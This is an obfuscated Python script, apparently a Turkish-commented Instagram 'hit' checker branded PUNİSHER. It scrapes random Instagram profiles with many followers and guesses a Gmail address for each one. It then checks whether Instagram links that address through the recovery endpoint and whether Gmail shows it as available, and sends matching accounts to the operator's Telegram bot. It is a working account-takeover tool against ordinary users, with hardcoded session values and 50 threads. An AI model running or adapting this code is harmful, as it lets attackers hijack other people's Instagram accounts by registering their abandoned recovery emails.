s = input
X = int
W = open
V = print
L = str
K = range
F = Exception
import os, sys, re, json as Y, string as Z, random as a, hashlib as t, uuid as b, time
from datetime import datetime
from threading import Thread as u
import requests as A
from requests import post as v
from user_agent import generate_user_agent as G
from random import choice as M, randrange as N
from cfonts import render as w, say
from colorama import Fore, Style, init
from rich.console import Console as x
from rich.panel import Panel
import webbrowser as y

init(autoreset=True)

# ⚠️ BOŞLUKSUZ URL'LER (DÜZELTİLDİ)
c = "https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/"  # <-- boşluk yok
d = "ig_sig_key_version"
e = "signed_body"
f = "mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj"
C = "Content-Type"
g = "Cookie"
D = "User-Agent"
AC = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
E = "https://accounts.google.com"  # <-- boşluk yok
h = "accounts.google.com"
i = "referer"
j = "origin"
k = "authority"
l = "application/x-www-form-urlencoded; charset=UTF-8"
O = "application/x-www-form-urlencoded;charset=UTF-8"
m = "tl.txt"
P = "@gmail.com"

# Renkler (değişmeden kaldı)
H = "\x1b[1;97m"
n = "\x1b[1;94m"
AD = "\x1b[1;96m"
B = "\x1b[1;30m"
z = "\x1b[1;33m"
A0 = "\x1b[2;32m"
B = "\x1b[1;31m"
AE = "\x1b[1;95m"
A1 = "\x1b[2;35m"
A2 = "\x1b[2;39m"
H = "\x1b[38;5;231m"
AF = "\x1b[38;5;208m"
AG = "\x1b[38;5;202m"
AH = "\x1b[38;5;203m"
I = "\x1b[38;5;204m"
AI = "\x1b[38;5;209m"
AJ = "\x1b[38;5;76m"
A3 = "\x1b[38;5;120m"
A4 = "\x1b[38;5;150m"
AK = "\x1b[38;5;190m"
AL = "\x1b[1;31m"
AM = "\x1b[1;33m"
B = "\x1b[1;31m"
z = "\x1b[1;33m"
AN = "\x1b[2;31m"
A0 = "\x1b[2;32m"
A2 = "\x1b[2;34m"
A1 = "\x1b[2;35m"
AO = "\x1b[2;36m"
AP = "\x1b[1;34m"
AQ = "\x1b[1;37m"
n = "\x1b[1;37m"

# Sayaçlar
Q = 0  # Hit
R = 0  # Good Gmail
S = 0  # Bad IG
T = 0  # Bad Email
U = 0  # Good IG
o = {}

# Başlık
A5 = w("{PUNİSHER}", colors=["white", "blue"], align="center")
V(
    f"""
[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
                      {A5}
[2;36m İnstagram FREE TOOL 
[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
)

# Girdiler
p = s("\x1b[1;33m -  𝐈𝐃 : ")
V("\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
q = s("\x1b[1;33m - 𝐓𝐨𝐤𝐞𝐧 : ")
V("\x1b[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
AA = X(s("\x1b[1;33m - Minimum Takipçi : "))  # <<<--- EKLENDİ
os.system("clear")

# Telegram video gönder
try:
    A.post(
        f"https://api.telegram.org/bot{q}/sendvideo?chat_id={p}&parse_mode=Markdown&video=https://t.me/eizontoolz/3&caption=  - By : [𝐄𝐢𝐳𝐨𝐧](t.me/D8N8D)"
    )
except F:
    pass

# Durum çubuğu (HIT / BAD vs.)
def J():
    A_str = f"\r{A3}Hits{A4} : {R}{I} |{B} Bad IG{H} : {I}{S}{H} | {B}Bad Email{n} : {I}{T}{B} | {H}Good IG{B} : {I}{U}"
    sys.stdout.write(A_str)
    sys.stdout.flush()

# Google token alımı (boşluksuz URL ile)
def r():
    try:
        B_chars = "azertyuiopmlkjhgfdsqwxcvbn"
        I = "".join(M(B_chars) for _ in K(N(6, 9)))
        J_val = "".join(M(B_chars) for _ in K(N(3, 9)))
        H_gap = "".join(M(B_chars) for _ in K(N(15, 30)))
        Q_headers = {
            "accept": "*/*",
            "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
            C: O,
            "google-accounts-xsrf": "1",
            D: L(G()),
        }
        R_url = f"{E}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        S_resp = A.get(R_url, headers=Q_headers)
        T_match = re.search(
            r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            S_resp.text,
        )
        if not T_match:
            raise Exception("Token extraction failed")
        T_val = T_match.group(2)
        U_cookies = {"__Host-GAPS": H_gap}
        X_headers = {
            k: h,
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            C: O,
            "google-accounts-xsrf": "1",
            j: E,
            i: "https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn",
            D: G(),
        }
        Y_data = {
            "f.req": f'["{T_val}","{I}","{J_val}","{I}","{J_val}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            "deviceinfo": '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
        }
        P_resp = A.post(
            f"{E}/_/signup/validatepersonaldetails", cookies=U_cookies, headers=X_headers, data=Y_data
        )
        Z_token = L(P_resp.text).split('",null,"')[1].split('"')[0]
        H_new = P_resp.cookies.get_dict()["__Host-GAPS"]
        with W(m, "w") as file:
            file.write(f"{Z_token}//{H_new}\n")
    except F as ex:
        V(ex)
        r()

r()

# Gmail kontrol
def A6(email):
    A_uname = email.split("@")[0] if "@" in email else email
    global T, R
    try:
        with W(m, "r") as H_file:
            I_line = H_file.read().strip()
        B_tl, K_host = I_line.split("//")
        L_cookies = {"__Host-GAPS": K_host}
        M_headers = {
            k: h,
            "accept": "*/*",
            "accept-language": "en-US,en;q=0.9",
            C: O,
            "google-accounts-xsrf": "1",
            j: E,
            i: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={B_tl}",
            D: G(),
        }
        Q_data = f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{B_tl}%22%2C%22{A_uname}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&"
        S_resp = v(
            f"{E}/_/signup/usernameavailability", params={"TL": B_tl}, cookies=L_cookies, headers=M_headers, data=Q_data
        )
        if '"gf.uar",1' in S_resp.text:
            R += 1
            J()
            A9(A_uname, "gmail.com")
        else:
            T += 1
            J()
    except F:
        pass

# Instagram e-posta sorgusu
def A7(email):
    global U, S
    F_ua = G()
    H_dev = "android-"
    I_dev = H_dev + t.md5(L(b.uuid4()).encode()).hexdigest()[:16]
    E_uuid = L(b.uuid4())
    K_headers = {D: F_ua, g: f, C: l}
    M_data = {
        e: "0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f." + Y.dumps({
            "_csrftoken": "9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",
            "adid": E_uuid,
            "guid": E_uuid,
            "device_id": I_dev,
            "query": email,
        }),
        d: "4",
    }
    N_resp = A.post(c, headers=K_headers, data=M_data).text
    if email in N_resp:
        if P in email:
            A6(email)
        U += 1
        J()
    else:
        S += 1
        J()

# Reset bilgisi
def A8(user):
    try:
        E_headers = {
            "X-Pigeon-Session-Id": "50cc6861-7036-43b4-802e-fb4282799c60",
            "X-Pigeon-Rawclienttime": "1700251574.982",
            "X-IG-Connection-Speed": "-1kbps",
            "X-IG-Bandwidth-Speed-KBPS": "-1.000",
            "X-IG-Bandwidth-TotalBytes-B": "0",
            "X-IG-Bandwidth-TotalTime-MS": "0",
            "X-Bloks-Version-Id": "c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0",
            "X-IG-Connection-Type": "WIFI",
            "X-IG-Capabilities": "3brTvw==",
            "X-IG-App-ID": "567067343352427",
            D: "Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)",
            "Accept-Language": "en-GB, en-US",
            g: f,
            C: l,
            "Accept-Encoding": "gzip, deflate",
            "Host": "i.instagram.com",
            "X-FB-HTTP-Engine": "Liger",
            "Connection": "keep-alive",
            "Content-Length": "356",
        }
        F_data = {
            e: '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'
            + user
            + '"}',
            d: "4",
        }
        G_resp = A.post(c, headers=E_headers, data=F_data).json()
        return G_resp.get("email", "Reset None")
    except:
        return "Reset None"

# Hit bilgisi & Telegram
def A9(username, domain):
    global Q
    B_info = o.get(username, {})
    D_followers = B_info.get("follower_count")
    E_posts = B_info.get("media_count")
    G_valid = bool(D_followers and E_posts and X(D_followers) >= 10 and X(E_posts) >= 2)
    Q += 1
    H_msg = f"""
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌 
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
𝒉𝑖𝑡 : [ {Q}  ]
𝑢𝑠𝑒𝑟 𝑛𝑎𝑚𝑒 : [ {username} ]
𝑒𝑚𝑎𝑖𝑙 : [ {username}@{domain} ]
𝑓𝑜𝑙𝑙𝑜𝑤𝑒𝑟𝑠 : [ {D_followers} ] 
𝑓𝑜𝑙𝑙𝑜𝑤𝑖𝑛𝑔 : [ {B_info.get('following_count')} ]
𝑝𝑜𝑠𝑡𝑠 : [ {E_posts} ]
𝑏𝑖𝑜 : [ {B_info.get('biography')} ]
𝑟𝑒𝑠𝑒𝑡 : [ {A8(username)} ]
✅ 𝗠ᴇᴛᴀ 𝗘ɴᴀʙʟᴇ ➟ {G_valid}
⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊⚊
[ 𝑷𝑹𝑶𝑮𝑹𝑨𝑴 :  𝑽𝒖𝒓𝒂𝒍]
"""
    K_console = x()
    L_panel = Panel(
        H_msg,
        title="Instagram Account Info",
        subtitle="Detailed Account Information",
        title_align="center",
        border_style="cyan",
    )
    K_console.print(L_panel)
    with W("Sthits.txt", "a") as M_file:
        M_file.write(H_msg + "\n")
    try:
        A.get(f"https://api.telegram.org/bot{q}/sendMessage?chat_id={p}&text={H_msg}")
    except F:
        pass

# Instagram scraper (minimum takipçi ile)
def AB():
    while True:
        D_data = {
            "lsd": "".join(a.choices(Z.ascii_letters + Z.digits, k=32)),
            "variables": Y.dumps({
                "id": X(a.randrange(1279000, 21254029834)),
                "render_surface": "PROFILE",
            }),
            "doc_id": "25618261841150840",
        }
        E_headers = {"X-FB-LSD": D_data["lsd"]}
        try:
            F_resp = A.post("https://www.instagram.com/api/graphql", headers=E_headers, data=D_data)
            B_user = F_resp.json().get("data", {}).get("user", {})
            C_username = B_user.get("username")
            G_followers = B_user.get("follower_count", 0)
            if C_username and G_followers >= AA:  # <<<--- Minimum takipçi kontrolü
                o[C_username] = B_user
                H_emails = [C_username + P]
                for I_email in H_emails:
                    A7(I_email)
        except:
            pass

# Thread başlat
for _ in K(50):
    u(target=AB).start()
